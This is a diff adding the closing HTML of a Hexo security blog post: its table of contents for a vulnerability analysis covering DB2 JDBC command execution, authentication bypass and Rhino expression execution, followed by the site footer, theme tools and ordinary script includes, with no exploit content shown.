+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">路由分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">补丁分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E8%A7%A3%E5%AF%86"><span class="nav-number">4.1.</span> <span class="nav-text">补丁解密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#patch%E9%80%BB%E8%BE%91"><span class="nav-number">4.2.</span> <span class="nav-text">patch逻辑</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%89%B4%E6%9D%83%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">鉴权分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#V10-windowUnloading%E5%AF%BC%E8%87%B4%E7%9A%84%E9%89%B4%E6%9D%83%E5%A4%B1%E6%95%88"><span class="nav-number">5.1.</span> <span class="nav-text">V10-windowUnloading导致的鉴权失效</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V11-%E9%89%B4%E6%9D%83%E9%80%BB%E8%BE%91"><span class="nav-number">5.2.</span> <span class="nav-text">V11-鉴权逻辑</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RMIServlet%E8%81%8C%E8%B4%A3"><span class="nav-number">6.</span> <span class="nav-text">RMIServlet职责</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#V11"><span class="nav-number">6.1.</span> <span class="nav-text">V11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V10"><span class="nav-number">6.2.</span> <span class="nav-text">V10</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DB2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">7.</span> <span class="nav-text">DB2命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">7.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">7.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">7.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stub%E6%8E%A5%E5%8F%A3%E7%BB%95%E8%BF%87%E2%80%94%E2%80%94DB2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">8.</span> <span class="nav-text">stub接口绕过——DB2命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">8.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-1"><span class="nav-number">8.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">8.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87%E2%80%94%E2%80%94DB2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">9.</span> <span class="nav-text">黑名单方法绕过——DB2命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">9.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">9.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96JDBC"><span class="nav-number">10.</span> <span class="nav-text">其他JDBC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#checkExpression%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%89%A7%E8%A1%8C"><span class="nav-number">11.</span> <span class="nav-text">checkExpression表达式执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">11.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-3"><span class="nav-number">11.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#checkJavaScript-Rhino%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%89%A7%E8%A1%8C"><span class="nav-number">12.</span> <span class="nav-text">checkJavaScript Rhino表达式执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-number">12.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-2"><span class="nav-number">12.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-4"><span class="nav-number">12.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">13.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">14.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">15.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2025</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">175k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">路由分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">补丁分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E8%A7%A3%E5%AF%86"><span class="nav-number">4.1.</span> <span class="nav-text">补丁解密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#patch%E9%80%BB%E8%BE%91"><span class="nav-number">4.2.</span> <span class="nav-text">patch逻辑</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%89%B4%E6%9D%83%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">鉴权分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#V10-windowUnloading%E5%AF%BC%E8%87%B4%E7%9A%84%E9%89%B4%E6%9D%83%E5%A4%B1%E6%95%88"><span class="nav-number">5.1.</span> <span class="nav-text">V10-windowUnloading导致的鉴权失效</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V11-%E9%89%B4%E6%9D%83%E9%80%BB%E8%BE%91"><span class="nav-number">5.2.</span> <span class="nav-text">V11-鉴权逻辑</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RMIServlet%E8%81%8C%E8%B4%A3"><span class="nav-number">6.</span> <span class="nav-text">RMIServlet职责</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#V11"><span class="nav-number">6.1.</span> <span class="nav-text">V11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V10"><span class="nav-number">6.2.</span> <span class="nav-text">V10</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DB2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">7.</span> <span class="nav-text">DB2命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">7.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">7.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">7.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stub%E6%8E%A5%E5%8F%A3%E7%BB%95%E8%BF%87%E2%80%94%E2%80%94DB2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">8.</span> <span class="nav-text">stub接口绕过——DB2命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">8.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-1"><span class="nav-number">8.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">8.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87%E2%80%94%E2%80%94DB2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">9.</span> <span class="nav-text">黑名单方法绕过——DB2命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">9.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">9.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96JDBC"><span class="nav-number">10.</span> <span class="nav-text">其他JDBC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#checkExpression%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%89%A7%E8%A1%8C"><span class="nav-number">11.</span> <span class="nav-text">checkExpression表达式执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">11.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-3"><span class="nav-number">11.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#checkJavaScript-Rhino%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%89%A7%E8%A1%8C"><span class="nav-number">12.</span> <span class="nav-text">checkJavaScript Rhino表达式执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-number">12.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-2"><span class="nav-number">12.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-4"><span class="nav-number">12.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">13.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">14.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">15.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
